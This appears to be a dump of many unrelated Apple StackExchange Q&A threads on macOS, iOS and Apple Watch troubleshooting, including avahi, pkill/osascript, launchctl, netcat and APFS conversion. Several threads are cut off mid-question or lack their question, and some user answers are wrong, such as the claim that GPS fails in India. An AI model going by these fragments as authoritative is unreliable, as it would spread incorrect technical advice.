I'll assume you've not \"tweaked\" your macos network configuration.\nWhen I've had issues similar to yours, I've been able to clear it up by installing avahi on the reluctant Linux host.  If your Linux host’s name is “jethro”, it will become jethro.local under the \"zero configuration networking\" scheme used by avahi and Apple's Bonjour. \nYou can easily check to see if avahi is installed on your Linux host; one way is type man avahi at the command line. If the man page is there, then avahi is almost certainly installed. If it's installed, you can check to be sure it's running: \n$ ps -ax | grep avahi \n... You should see something like this as the output:\n  346 ?        Ss     0:20 avahi-daemon: running [raspberrypi3b.local]\n  383 ?        S      0:00 avahi-daemon: chroot helper\n\nWhere raspberrypi3b.local is the Linux host from which I ran this command. \nIf it's not installed, there's almost certainly an avahi package for your distro. Install it, and let us know if that resolves your issue. \nIf avahi is installed & running, and you see a similar output to mine, then my guess/answer probably won't help you. You may want to try one of the other SE sites to get help troubleshooting.   \nAlso, there's a good overview of zero config networking, and Bonjour in particular, in this Server Fault SE Q&A\n", "Q: Strokes is getting deleted while writing When I’m writting with a stylus while keeping my hand on my iPad 6th gen ios 12.1.4, some of the strokes keeps dissapearing\nMy attempt to resolve\nI found solution online suggesting me to turn off magnification feature .

I am going to USA for 15 days next month. I am thinking to buy an Apple watch series 3 or 4 only GPS, no requirement for cellular for me. Will it work when I come back to India? I am living in India permanently.\n\nA: The Watch will function perfectly fine in India, however some functionalities will not work or be limited. This is for example the ECG feature, turn-by-turn navigation, the News app, etc.\nThere's no reason to buy the Watch in the US in hope of getting access to US-only functionality, as that functionality most probably will not be available in India and will cease to function when you get back, or at a later time when the software is updated.\nYou enquire about the GPS - it will work fine all over the world. Also in India. Other answers here focus on other positioning systems such as the Indian IRNSS (NAVIC). It is not supported on the Apple Watch, no matter if you buy the watch in India or in the US. It is also not supported on iPhones or any other Apple device. The Apple Watch supports GPS (US operated), GLONASS (Russian operated), Galileo (EU operated) and QZSS (Japan operated).\nAs you're looking at the model without cellular, you do not have to worry about cell coverage. The other answers that talk about LTE bands, etc. are irrelevant when the watch does not have cellular. The Watch will use your iPhone for calls, SMS, etc. and automatically supports whatever iPhone you have with the LTE bands, etc. it is using for communication.\nThe last thing to note is that the Watch in the US comes with a US charger. I.e. they are 110V/60Hz and a different type of plug, compared to the 230V/50Hz system and plugs used in India. You will need an adapter to be able to use the charger, or you could substitute any ordinary USB charger. The magnetic charging puck for the Apple Watch comes as a seperate cable that is plugged into the charger, so you will be able to use a different charger very easily.\n\nA: Obviously it would be best to ask Apple, but based on what I know, I'm pretty certain the watch will function correctly while you're in India, but GPS services will not. India's NAVIC is independent from the European Galileo and American GPS satellite systems.\nI'm pretty certain that most of your apps will work between the Apple Watch and the phone, though you may have issues if you're doing international roaming. You should even be able to make and answer phone calls from your watch.\nLTE, I'm pretty certain will NOT work since the carriers in India use different bands.\nUltimately you should ask Apple, but given that a US-purchased Apple Watch functions fine when visiting India, I think you're safe.\nGood luck! If you find out otherwise, please let us know.\n\nA: GPS works all over the world. That is why it's called the Global Positioning System.\nI don't know whether or not the Apple Watches can utilise the Indian NAVIC, but I guess it's unlikely. Despite that, GPS should still work, as these are independent systems.\n", "Q: macOS Mail: How to remove background color of a message in message list? In MacOS Mail, we can change the background color of a message in the message list.  This could happen in two ways AFAIK: (i) Select a message, go to Format -> Show Colors, then choose a color, or (ii) Setup a rule that automatically set the background color based on some conditions.\nThe question is: once the background color is set, I can't seem to find a way to remove the background color.  I can only change it to another color.  This does not work well when we switch between dark mode and light mode. What I would like to do is to remove the colors all together (or equivalently, make the background transparent).

I am about to choose one, either the base model or the 9th gen core i5 for more processor power. \nFrom your experience with previous models, does loud fan noise due to overheating also occur for the base models, or is this a problem of the higher end processor choices? \nIt seems that the thermal design power of the base model currently is 65W, but both for the 9th gen i5 and the i9 it is 95W. Would this mean that the high end i5 is as bad as the i9 in terms of expected fan noise, i.e. similar problems as for earlier i7s should be expected? For the graphics cards, it is currently 120W vs 150W in favor of the base model. \n\nA: \nFrom your experience with previous models, does loud fan noise due to\noverheating also occur for the base models, or is this a problem of\nthe higher end processor choices?\n\nUnfortunately, in the Apple community, this is a common miscorrelation.  So, let's first set the record straight...\nFan Activity ≠ Overheating\nJust as the radiator fans in your car periodically come on to move additional air across the radiator, the fans in your computer (PCs and Macs) spin up to move additional air across the fins on the heat sink in an effort to dissipate heat.\nHearing fan activity is a perfectly normal and expected behavior regardless of the processor, memory, or general specifications of the machine.\nFan Noise\nThere are only two fan noises that you should be concerned with:\n\n*\n\n*Squealing and/or grinding indicating a failed bearing\n\n*No fan spin at all indicating a full failure\n\nOverheating\nLike your car, you will know exactly when your computer overheats.  It will slow down and eventually shut off.  Granted, there's much more fan fare with a car, usually with steam and coolant gushing everywhere though with the computer, lost work can make you feel pretty steamed and some choice expletives are also probably going to come gushing out at well.\nHowever, unlike your car, this is by design.  Your processor will thermally throttle it's speed limiting what it can do and if all else fails, it will power off in a bid to save itself.\nIt's not just the CPU\nThe fan spins up because the overall temperature within the chassis is high enough to warrant it.  This can be from the CPU, the GPU, the drives, the logic board and in the case of AiOs (iMac), the display and the power supply.  Even the ambient external temperature is a factor.  All of that contributes to the internal thermal conditions which may necessitate the need to spin up the fan.\nTDP or Thermal Design Power\nTDP is the maximum amount of heat that your processor will generate on average use.  A higher number means it will allow more and higher processes before it gets into the \"red zone\".  In other words, a processor with a higher TDP will do more before the fans spin up or throttles back to cool off.  In your case, comparing the 9th generation i5s with previous generations, you get a higher TDP because the chips are more efficient, not that they generate more heat.\nFan Control Software\nUnless you intend to manually increase the fan speed in an effort to keep things extra cool, this is the worst thing you can do.  Slowing the fan in a bid to make it more audibly aesthetically pleasing will only result in one thing - putting a cap on the processing power of the machine you paid money for.  This is like buying a high performance car and immediately installing a restrictor plate.\nBottom Line\nBuy the iMac that meets your needs (CPU, GPU, memory, storage).  Fan spin shouldn't be part of that equation.\n\nA: Keep in mind that the TDP is \"typical.\" If the processor is idle, it may use considerably less power. If you're hitting all the cores/threads hard AND the GPU, that's where you'll hear the fans spin up and holler at you.\nFor the same processor generation and process (e.g. 10nm, 15nm, 17nm, whatever), the same workload will generate a very similar heat load regardless of the number of cores/processor speed. However, if you have more cores/threads/higher processor speed, the system may try to do more work in a shorter period of time. That can cause the fans to spin faster, but for a shorter period of time.\nMy suggestion is to get the base model, then download a fan control utility to set a reasonable limit on the fan speed. When the processor gets hot, it'll just throttle down and run slower. \n", "Q: Clone hard drive from 2017 Macbook Pro to 2012 iMac My Macbook needs to be sent to the store for repair and I plan on making a block level clone of it to an unused iMac that I have. My question is will the iMac be able to boot and not crash due to the hardware having changed very significantly.\nThe method I'm talking about is making a block level clone like dd so that the iMac's drive is identical to the Macbook's. NOT a time machine backup or simple copy of files over.\n\nA: In the past I have often booted my main operating system from different Macs, while my MacBook was in repair. Sometimes you may have to redo some of the settings, such as Network preferences. Also, restoring the recovery partition (see also below) can be annoying.\nFirst you need to figure out if your iMac is compatible with the version of MacOS you are using. In case you use Mojave, compatible iMacs are: \"iMac introduced in late 2012 or later\" according to Apple's support page. In case your iMac is such a model, you should be fine. \nI suggest you simply try it by cloning your macOS to an external USB SDD or HDD and boot from it.\n\n\n*\n\n*Clone the drive. I really like SuperDuper! which can be used for free. Alternatively, Carbon Copy Cloner (commercial) is also nice, because it can also clone and restore your hidden recovery partition. The recovery partition is not necessary for booting.\n\n*Connect the USB drive to your iMac. \n\n*Press the alt button before the startup sound. \n\n*Select the USB drive.  \n\n\nPlease make sure your USB drive is formatted with the GUID Partition Map, as this is required for booting external drives.\n", "Q: Is it possible to speed up Spotlight indexing? Since Spotlight did not find a number of files on my disk, I decided to rebuild its index using the suggested method. \nNow Spotlight is reindexing my drive, which usually takes about 2–3 hours. However, the indexing processes mds* seem to run on low priority, because they never really use more than 50% of the CPU. \nIs there a way to prioritise the indexing process, thus speeding up indexing?\n\nUpdate\nIn relation to bmike's answer, also disk access seems rather slow - at least for a MacBook Pro SSD. The arrow indicates where I stopped other processes that were active. \n\n\nA: I doubt your process is CPU bound so you would need to bring faster storage to have it progress faster. \nThe pragmatic answer to this is:\n\n\n*\n\n*just quit other programs that contend with IO\n\n*log out if you have sync products like Dropbox, Box, OneDrive or backup software that also scans for all file changes\n\n*be more selective - rebuild the index on a subset of the system if you need that portion to be done sooner\n\n*schedule your rebuilds for when you can walk away and not care how long it takes\n\n*if kernel_task is high - keep your machine cool (extra cool room, airflow, etc...) but that addresses CPU bottlenecks - not IO or data.\n\n\nYou can confirm my thinking in the Disk section of Activity Monitor and see what the reads in and out per second are and the bandwidth. Spotlight spins up multiple workers and is pretty sophisticated about doing parallel rebuilds, so it's unlikely you'll be able to twiddle with anything or cajole it to chew through all the content in all the files for all the data detectors in the system.\nYou can see these processes named mds, mdworker, mdwrite and variants of those core functions.\nIf you're logged out you'll need to ssh in and use top -u -s 10 or iostat 60 to see the activity level off or just check back on the visual indicator when you log back in.\n", "Q: Mac asking for username and password on starting up I am running MacOS High Sierra on a Macbook air and this is the screen that usually comes up on booting.\n\nThe mac starts up after typing the right password.

In Terminal type e.g. man pkill and press enter, or just type the command and right-click on it, then select: Open man Page\n\nA: If the application has a log name, make sure to give the full name which is listed in applications\ne.g. close and then reopen\nosascript -e 'quit app \"Cisco AnyConnect Secure Mobility Client.app\"'\nopen /Applications/Cisco/Cisco\\ AnyConnect\\ Secure\\ Mobility\\ Client.app/\n\n\nA: I added this to my .zshrc to quit an app using Matteo's answer\nqapp() {\n    osascript -e \"quit app \\\"$1\\\"\"\n}\n\nUsage: $ qapp Slack\n\nA: Since I don't yet have the reputation to comment, I'm saying this as a separate answer. pkill without any flags does not match a specific process! For example, running pkill foo would target processes named foo, but would also target processes named foobar. This is because it uses regular expressions.\nIf you wish to kill a specific process, you can pass it the -x flag. For example, pkill -x foo. This will use exact names instead of regular expressions.\nFor example, in your case, pkill -x Slack will do the trick.\n\nA: If you are looking to kill Slack automatically at 6pm. Just add the following to your crontab\n$ crontab -e\n0 18 * * * pkill -x Slack\n\n\nA: No, you can use pkill to terminate a running application. For example -\npkill Notes\n\nIf this fails, there is an alternate way\nGet the process ID of the app using pgrep. For example -\npgrep Notes\n\nThen to quit the app use\nkill <process ID>\n\n", "Q: Apple Developer Enterprise Program - Change Account Holder I have access to our company Apple Developer Enterprise Program account as Admin. The guy with the Account Holder role left the company a few weeks ago, but his Apple is still linked to the account as Account Holder.\nHow do I change my access type from Admin to Account Holder?\n\nA: You'll need to gain access to the email account used for logging in as Account Holder.\nMost likely, the email address domain used as Apple ID to login must be registered/created by your organization. You'll need to follow the proper chain of command internally and gain access to the email account via IT.\nOnce you have the access, either continue using it or assign the Account Holder role to your Apple ID.\nYou can refer to the Developer Program roles here:\n\n\n*\n\n*Apple Developer Program Roles\n", "Q: Close all open finder windows from terminal?

Can I:\n\n\n*\n\n*Remove Xcode (how to do so properly?)\n\n*Install Command Line Tools (I can download them as a developer BTW)\n\n*Have a working Homebrew installation\n\nA: You don't need to have Xcode installed on your system to install Command Line Tools. Command Line Tools can be installed independently from Xcode.\nFor your scenario, to remove Xcode, take either one of the two approaches depending on how you installed it in first place:\n\n\n*\n\n*If you have installed Xcode via Mac App Store, simply open Launchpad, press and hold the Alt key, and click on the cross button shown towards top left of the Xcode app icon.\nThis will uninstall Xcode completely.\n\n\n\n*If you have installed Xcode via copying from a DMG, simply trash the Xcode.app bundle.\n\n\n\nOnce you have uninstalled Xcode, you can independently install only the Command Line Tools by running the following in Terminal:\nxcode-select --install\nYou don't need to have an Apple Developer account for doing so, neither will you need to download anything directly from Apple Developer website.\n\nA: Running xcode-select --install didn't work for me after deleting Xcode through Launchpad, because Terminal response was\nerror: command line tools are already installed, use \"Software Update\" to install updates\n\nIn App Store Xcode looked deinstalled and also downloading the Command Line Tools from https://developer.apple.com and installing them from the .dmg didn't fix this.\nI then ran\nsudo xcode-select -s /Library/Developer/CommandLineTools\n\n(found in https://stackoverflow.com/questions/34617452/how-to-update-xcode-from-command-line) and now everything works just fine and I saved ca. 17GB of space :)\n\nA: Yes. \nI did it a while ago, so I can't recall exactly how I uninstalled Xcode. If there isn't an uninstall option in the App Store, then I just moved Xcode to the trash and deleted it. \nI was able to install the command line tools by: \n\n\n*\n\n*going to https://developer.apple.com \n\n*logging in\n\n*going to Account > Downloads > See More Downloads \n\n\nand there is an item called Command Line Tools (macOS 10.14) for XCode 10.2\n", "Q: What would happen if I deleted AdSheet.app and iAdOptOut.app (iOS) I have an iPhone 6s, jailbroken running iOS 10.3.3. In /Applications/, there are two apps, one named AdSheet and the other names iAdOptOut. What would happen if I deleted these with terminal? Would I no longer get adds?\n\n\nA: If you deleted those apps, you would only not be able to get ads provided by Apple's AdSheet API. Apple doesn't support this API anymore, so it would only affect a very limited number of old(er) apps.\n", "Q: Is there a quick way to connect bluetooth headphones to Apple TV (4th gen) when the in-app menu doesn't support it? Most apps allow me to quickly swipe down from the top of my \"Siri Remote\" and select my bluetooth headphones from the in-app menu but some apps (e.g. YouTube) don't offer that functionality so I have to dig into the Apple TV Settings to connect my headphones.\nThis is tedious - is there a better way?\n\nA: When you're on the main menu or in the \"TV\" app you can press and hold the Play/Pause button which will bring up a simple menu for selecting your audio output from the available (powered on) devices:\n\n", "Q: Rebuild APFS Container Scheme using Terminal I am having an issue with an internal HDD from my MacBook Pro Mid-2012 by some reason not sure why it change the file system from GUID to APFS. Right now I been trying to recover my data but there are several files that are shown as \"corrupted\", so I been researching that the is a way I could fix or rebuild the partition table but I am not sure which one I am currently have the GUID or the APFS but I am sure there is one that is corrupted. Actually I have tried with DiskWarrior but it tells me that \"APFS is not supported\" so I want to try if there is a way by using Terminal.\n\nAny help will be much appreciated.\nThanks\nAlberto\n\nA: Too much for a comment, so I'm dropping this in the answer space - be kind ;)\nGUID isn't the partition format, it's the underlying 'low level' format, as opposed to MBR. Previously, Macs used HFS+ for the file system, but that will have been automatically updated to APFS perhaps when you upgraded to Mojave [ iirc.. SSDs would have changed at High Sierra, HDs at Mojave]. As you rightly say, DiskWarrior cannot yet handle APFS, only HFS+. \nI'm not sure you should be thinking about rebuilding the partition table, or writing anything at all to a disk with signs of corruption until you can safely rescue the data you have on there.\nIf you have a solid backup then you could always just reformat, which would take any bad blocks out of service.\nWithout a backup, then you ought to be using another Mac to download & create a rescue boot drive; avoiding writes to the suspect drive.\nThere are several apps which may be able to recover your data, Recovering an accidentally deleted  folder in OSX - no Time Machine or backup available  has some options.\n", "Q: How can I see the history of stories I've read on Apple News?

Can't seem to run it through VirtualBox's guestcontrol, only lets you launch apps, not run commands directly. Saw some people suggest SSH, but wanted to see if there's a more direct way before I start down that path. Thanks!\n\nA: Finally got it working after about 8 hours of trying different things:\nVBoxManage guestcontrol \"vmname\" run /bin/sh --username usr --password pass --verbose --wait-stdout --wait-stderr -- -c \"echo test\"\n\nHope this helps someone else!\n\nA: If your guest OS is macOS, try having VBoxManage guestcontrol /bin/bash -c \"commandToExecute\"\nSSH is a perfectly fine solution as long as you have a reliable way to get the IP address and your guest VM exposes SSH, has a key setup, etc.\n", "Q: Failing to send Wake-On-LAN UDP packet with netcat I'm trying send a WOL packet from a bash script under Mojave, much like https://stackoverflow.com/a/31588036/9370650, without any third-party utilities, such as the nifty https://github.com/jpoliv/wakeonlan.\nI don't, however, seem to be able to successfully broadcast anything at all to 255.255.255.255 on port 9 using netcat.\nIf I listen to UDP port 9 like this:\n$ nc -uv -l 9 -w0\nnetcat then reports the WOL packet when I run the perl-based wakeonlan script I mentioned above.\nBut, if I try to do my own UDP broadcast to 255.255.255.255:9, like this:\n$ echo \"hello\" | nc -vu 255.255.255.255 9\nit isn't seen by my listening instance of netcat.\nFor the record, the output from my attempt to broadcast looks like this:\nfound 0 associations\nfound 1 connections:\n     1: flags=82<CONNECTED,PREFERRED>\n    outif (null)\n    src 192.168.1.7 port 51674\n    dst 255.255.255.255 port 9\n    rank info not available\n\nI'm not a networking expert, so I'm likely misunderstanding something here.\nAny thoughts on what I'm doing wrong?\n\nA: I've likely answered my own question:\nThe BSD version of netcat included with macOS lacks the -b (broadcast) flag.\nAnd even though 255.255.255.255 is a special global address for broadcasting to the entire subnet, simply sending to it apparently isn't enough to imply/accomplish a broadcast without that missing -b flag.\nSo, my impression is that the macOS version of netcat simply won't do what I'm trying to do.\nIf I were to install an alternate netcat implementation using homebrew or some other source, it might accomplish it--but at that point, I'd rather just depend on having wakeonlan installed.\nI'll leave this answer here, but unaccepted, hoping that someone with more low-level networking know-how provides a better answer at some point.\nEdit: Also, if one were going to install other software due to netcat limitations, it looks like socat (described as \"netcat on steroids\") would likely be something to seriously consider, instead of just an alternate version of netcat.\n", "Q: How to copy and paste as plain text on iOS?

I spend a lot of time using my Macbook Pro with work-related web conferences. My ideal setup would be a high quality speaker and microphone that I can use via bluetooth/airplay/wifi with my Macbook for the audio portion of these web conferences. Added ++ if there's a physical mute button.\nCan the Homepod function in this way?\n\nA: Unfortunately no. It is not possible to use the HomePod's built-in microphone for recording audio to a Mac. You cannot Bluetooth pair the HomePod to a Mac in order to use it as a combined speaker/microphone either.\nOther products exists that does what you're looking for. For example I'm using the Logitech Group speaker/microphone combination for web conferences.

Is there a way to make a shortcut that switches to the next window for the app, even if its in a different desktop?  \nIn Mission Control Preferences I have \"When switching to an application, switch to a Space with open windows for the application\" set.  I also tried setting \"Group windows by application\"  \nseen on MacOS 10.14.3 Mojave (OSX)\nThanks\n\nA: Under the conditions you've expressed, here's an alternative that I use when ⌘` isn't a viable option.\nUsing the example AppleScript code below, saved as a .scpt file in Script Editor, and using FastScripts to assign a keyboard shortcut to it, it clicks the frontmost application's Dock Tile so it will switch between Desktops. For this particular script in FastScripts, I use keyboard shortcut ⌃⇧⌘D to trigger it.\ntell application \"System Events\" to click UI element ¬\n    ((get name of application processes whose frontmost is true) as text) ¬\n        of list 1 of application process \"Dock\"\n\n\nOr, if you do not want to use a third party app to trigger the .scpt file, the example AppleScript code can be used in an Automator Quick Action1, setting Workflow receives no input in any application and add a Run AppleScript action, adding the example AppleScript code where is says: (* Your script goes here *), then save the Quick Action.\nYou can then assign a keyboard shortcut in: System Preferences > Keyboard > Shortcuts > Services\n\nNote that using either method may require accessibility privileges be granted.\nAlso keep in mind that when assigning global keyboard shortcuts, there is always the potential to conflict with an already assigned shortcut, so you may have to use a different one and or add error handling to the example AppleScript code\n\n1 In versions of macOS prior to Mojave a Quick Action is called a Service.\n\nNote: The example AppleScript code is just that and does not contain any error handling as may be appropriate. The onus is upon the used to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide.

I don't recall if I was asked about upgrading to APFS when Id id that, but at this time the main volume is Mac OS Extended (Journaled).\nMy current About This Mac...version is Mojave 10.14.1 (18B75). Now, when updates are advertised from the App Store, I'm unable to upgrade because 10.14.3 is required.\nNo OS updates show in the App Store, and when I searched for the updaters (10.14.2 Combo, etc), I can't install because the installer reports \"macOS 10.14.2 Update can't be installed on this disk. This Mac can only install macOS on APFS-formatted drives.\"\nI tried the search results recommending to boot in Recovery Mode and use Disk Utility, but APFS is not available as a type.\nI have good backups and I can reformat the boot volume if I need to, but I have not done this before. Should I get a 10.14.3 installer to do this and boot from an external drive? The only guies and message boards I've found just keep saying to install 10.14.3 (I can't) or convert the disk in Recovery Mode (APFS is not available as an option.)\nAny known-good ways to get my 10.14.1 upgraded so I can keep getting App Store updates?\n\nA: I had the same problem. After multiple searches, the only way I found to get the drive updated to APFS was the following:\n\n\n*\n\n*Full clone of internal drive to external drive using SuperDuper! (Carbon Copy Cloner would also work from what I've read)\n\n*Reboot from external drive \n\n*Reformat internal drive as APFS  \n\n*Full clone of external drive to internal drive using SuperDuper! \n\n*Reboot from internal drive\n\n\nIt feels like there should be an easier way to do this, but I couldn't find it.\n\nA: I had to try a different route, since when i cloned back from my external drive (using CCC both directions), the newly updated internal hard-drive (erased and updated to APFS) wasn't bootable. \nWhat i did instead, from being in my Mojave stuck in beta Mac:\n\n\n*\n\n*Create a full Time Machine backup onto external backup drive #1.\n\n*Using CCC, create a fully bootable copy of my Mac onto external drive #2.\n\n*Reboot to Recovery mode (Cmd-R), and erase/reformat the internal drive to Mac OS Extended (Journaled).\n\n*From there, switch over and reinstall the OS. This put me all the way back at Mavericks (10.9.5). Important NOTE: make sure you know your Apple ID and password, and if you have two factor auth setup, make sure you have your second device ready to go.\n\n*From Mavericks, update the OS to Sierra (this is where the two factor verification came in).\n\n*From Sierra, update to Mojave, which will update the file system to APFS.\n\n*From Mojave, run Migration Assistant under Applications > Utilities, and copy over all your apps and files from the Time Machine backup (ext drive #1).\n\n\nYou're good to go!\nTechnically the second backup drive is not needed, but i am paranoid, and i was glad to be able to boot to that while i figured out all the steps. The above worked well.\n\nA: I had Mojave 10.14.1 installed on a solid state drive with Mac OS Extended (Journaled).\n\n\n*\n\n*I keep regular Time Machine backups, if you don’t, find a way to make your backup first, you’ll need it. \n\n*I shutdown my Mac Pro and unplugged my Apple Tower (which I choose to connect via LAN, instead of WiFi. \n\n*I booted into recovery mode, opened Disk Utility, and erased my drive using Mac OS Extended (Journaled). \n\n*I closed Disk Utility, choose to install new OS and on my machine it defaulted to Sierra. \n\n*After the install and auto-reboot, I went to the apple site to upgrade and Catalina was offered. I knew I could find High Sierra, but chose adventure instead. I downloaded Catalina and was allowed to choose my drive and install. The process said nothing of APFS.\n\n*After the Catalina install and auto-reboot, I opened Disk Utility to check the drive format. The drive was APFS. \n\n*I then shut down, reconnected my Apple Tower, restarted in recovery mode, went to Terminal and turned sleep off for everything, chose to restore from time machine backup, entered my time machine password, chose the backup to use (which reflected the old OS version), selected my HD, and clicked Erase Disk when prompted.\n\n*After my time capsule recovery was complete, I did have to re-upgrade to Catalina. \n\nA: Yes, you can go for APFS, even any old flash drives, for example, 4gb or 8gb.\nYou can convert it into APFS, done through Disk Utility.\n", "Q: App cannot create folder when needed, needs permissions I'm trying to use Unity to export the app I'm creating. It gets about halfway through the process before showing the message:\n\"Creating directory. Creating directory Library/ScriptAssemblies failed. Please ensure there is enough disk space and you have permissions setup correctly.\" \nThere's 60GB of free space. I don't understand permissions well enough to know what to do here. I could really use some help, I only know Windows.\n\nA: This  problem could be solved by deleting the \"library\" which is generated by Unity. Unity directory is as following:\nUnity >\n- Assets\n- Library <- Delete the directory, and reopen Unity\n- Log\n- ProjectSettings\n- Temp\nOn the other hand, you can see information about permissions and their errors in the following Apple website: https://support.apple.com/en-au/HT203538\n", "Q: How can I open an app using Terminal?

Slack acctually opens but it does generate a error msg in terminal.. The two others generates errors and doesn't open. The errors are Execution errors.\nNow I tried with AppleScript, is bash better?\nHow can this be done?\n\nA: Just as #grg said, you can use open -a ApplicationName\nExample\nopen -a Calendar\nThere are a number of options that can be used with the opencommand. \nTo see all of them, type on the terminal  \nman open \nHere is a list of possible options for the open command.\n$ open\nUsage: open [-e] [-t] [-f] [-W] [-R] [-n] [-g] [-h] [-b ] [-a ] [filenames] [--args arguments]\nHelp: Open opens files from a shell.\nBy default, opens each file using the default application for that file.\nIf the file is in the form of a URL, the file will be opened as a URL.\nOptions:\n-a Opens with the specified application.\n-b Opens with the specified application bundle identifier.\n-e Opens with TextEdit.\n-t Opens with default text editor.\n-f Reads input from standard input and opens with TextEdit.\n-F --fresh Launches the app fresh, that is, without restoring windows.

Instead, you can either use\nosascript -e 'tell application \"Mail\" to activate'\n\nor\nosascript -e 'tell application \"Mail\" to launch'\n\nYou can see this question for the difference between the two.\n", "Q: Process \"warmd\" keep busy mac after upgrading to macOS 10.14.4 After upgrading my Mac mini to macOS Mojave 10.14.4, every time I restart the computer the process \"warmd\" keep busy CPU and hard disk for 10-15 minutes, with great \"spooling\" noise and slowing down all the finder. What's happened? Its a well known bug of the upgrade?\n\n\n\nA: It's supposed to \"warm\" the cache with your most frequently accessed applications and files.\nIf you have a \"spinning rust\" disk drive instead of an SSD, I can imagine that it may hurt more than help.\nOn my 2017 15-inch MacBook Pro with SSD for storage, I see high CPU utilization immediately after reboot for a few minutes, but between the 8 threads and the very fast storage, I don't notice a significant slowdown.\nI think warmd pretends to load each of your 10 most frequently used applications and all the files you normally have open to \"warm\" its caches. Theoretically this will help your machine run faster when you actually try to use those applications/files.\nWith an old hard disk instead of an SSD, this just gives the system a lot of busy work to do and may not be such a wise idea. Also, while an SSD can perform several reads and writes at different places on the disk with very little delay between operations, a hard disk can only do 1 thing at a time, so with thousands of requests in the queue, boot time will suffer. Please file a RADAR with Apple. I can't currently find a way to disable warmd. If you want your machine to be responsive immediately after booting, this is a step in the wrong direction, and is a serious goof on Apple's part.\n\nA: Have a read of the following;\nProvisioning OSX and disabling unnecessary services\nIt has instructions on how to disable warmd. I can not confirm they are still relevant at this stage as I myself am installing the latest OSX as we speak. I will provide more details after that install finishes.\nTL;DR\nKill warmd: sudo launchctl kill -9 system/com.apple.warmd\nDisable warmd: sudo launchctl disable system/com.apple.warmd \n\nA: You can use a scheduling app like Scheduler for Mac to launch an AppleScript to quit warmd upon reboot. Just look for it on the internet and read its help to know how to do it.\n", "Q: Recover MS Word disappeared files Using MacOS High Sierra while had 6-7 unsaved word(V-16.23) document where I was working on. coz of my processor fan speed, I tried to check the 'Activity Monitor'. and found WindowServer is using almost 1gb so killed that process.\nThen I realized all was for my unsaved word documents....I'm literally crying after losing all my data, Can someone please help me out?\n\nA: You can hope that you had auto-save enabled in Word. If that is the case, you should be able to start Word again, and it will ask you if you want to recover those documents. You can also check the auto recovery folder manually for files:\n/Library/Containers/com.microsoft.Word/Data/Library/Preferences/AutoRecovery/\n\nIf you have Time Machine enabled, try starting it up and seeing if you have got versions saved of the documents there. Even when you haven't got the external backup drive connected, Time Machine will still save backups locally. However, it can ofcourse only do so if your documents were actually saved to files before Word were closed.\nIn regards to your actions: The usage of RAM (for example 1 GB) has absolutely nothing to do with processor fan speed. The WindowServer manages all application windows on screen, including for example Word and any other application. Killing it essentially kills all graphical programs, and you're logged out and will have to login again and start over.\n", "Q: iCloud Keychain in Safari Requires Password I'm running macOS 10.14.4 with iCloud keychain.

That wasn't the behavior since lately.\nI saw some articles which advice to resent login keychain password, but that option is not available in the current version of macOS.\nIs that behavior is by design or something is wrong with my security configuration?\nThanks,\nGil\n\nA: On Mac OS 10.14.4, go to system preferences, select Touch ID. Uncheck using Touch ID for Safari AutoFill.\nIt will no longer require Touch ID to autofill passwords and reverts back to earlier behavior.\n\nA: These changes are by design, introduced in Safari Technology Preview Release 66 and promoted to Safari in macOS 10.14.4.\n\nPassword AutoFill\n  \n  \n*\n  \n*Automatically submit login forms when filling credentials with Password AutoFill\n  \n*On MacBook Pro with Touch Bar, require authentication with Touch ID to fill passwords into web pages; this can be changed in Safari’s AutoFill preferences\n  \n\nhttps://developer.apple.com/safari/technology-preview/release-notes/\n", "Q: How to turn off sounds in the Messages app on the Watch? One of the great features of the Apple Watch is its unobtrusiveness: I can receive a message, look at it, and respond to it without disturbing the people around me with a series of beeps or vibration buzzes.\nHowever, this is only partly true for the native Messages app: When I send a message, either by selecting one of the pre-defined answers like \"yes\", \"great!\", etc. or by tapping an emoji, sometimes (not always) the Watch will emit the classic Messages \"bwouup\" sound of an outgoing message.\nI would like to turn off the sound of this app, but so far I haven't been able to find out how. I'm not asking how to turn off the sound of the Watch entirely, but rather for (sending) Messages specifically.\nWhat I've tried so far\nI've looked at the Messages settings in the Watch app on my iPhone and the settings of the iPhone app itself, as well as the sounds & haptic and the notifications settings. The latter allows me to influence how incoming messages announce themselves, but I haven't discovered any settings for outgoing ones.\nIs it possible to disable the sound of outgoing messages in the Watch's Messages app?\nUpdate\nIn the meantime, I realized that incoming messages are also accompanied by a sound, if the Messages app happens to be active on the Watch. I would like to disable those sounds as well.\n\nA: The watch can be made almost entirely silent, but still give you notifications through haptic feedback by going to Sounds & Haptics and turning on both Silent Mode and Haptic Alerts. \n", "Q: Compilation error with Mojave: error: ‘_Atomic’ does not name a type After updating to Mojave 10.14.4 and Xcode 10.2, I fail to compile GCC 8.3.0. The error message is\nIn file included from /usr/include/sys/sysctl.h:83,\n                 from ../../gcc-8.3.0/gcc/config/darwin-driver.c:30:\n/usr/include/sys/ucred.h:94:2: error: ‘_Atomic’ does not name a type\n  _Atomic u_long          cr_ref;  /* reference count */\n  ^~~~~~~\n\nI have not found any clue how this can be fixed. The header in question is\nstruct ucred {\n    LIST_ENTRY(ucred)       cr_link; /* never modify this without KAUTH_CRED_HASH_LOCK */\n#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L && !defined(__STDC_NO_ATOMICS__)\n    _Atomic u_long          cr_ref;  /* reference count */\n#elif defined(__cplusplus) && __cplusplus >= 201103L\n    _Atomic u_long          cr_ref;  /* reference count */   // <--- this line\n#else\n    volatile u_long         cr_ref;  /* reference count */\n#endif\n\nAny ideas are highly appreciated!\n\nA: I encountered the same problem myself. The error is actually reported by g++, a C++ compiler. On MacOS 10.14.4, the header file <sys/ucred.h> uses the _Atomic keyword for C++, although it is only defined in the C standard. (I assume that Apple's compiler clang++ defines this keyword as extension to the C++ standard.)\nThe proper fix is to tell gcc to \"fixinclude\" the header file <sys/ucred.h>. This patch does this. This is a patch that needs to be applied to the source code of GCC 8.3.0 before building it.\n\nA: You need to use a C11 compatible compiler in order to have support for the _Atomic keyword.\nEnsure that you are compiling with a recent, modern compiler, and that STDC_NO_ATOMICS is not defined.\nIt might be easier for you to use HomeBrew in order to compile it without having to configure anything yourself. After installing HomeBrew, you can install gcc with:\nbrew install gcc\n\n\nA: I had the same issue and I found a solution here.\n\nmacOS Mojave changed the location of the system headers, this broke the GCC 8 build process.

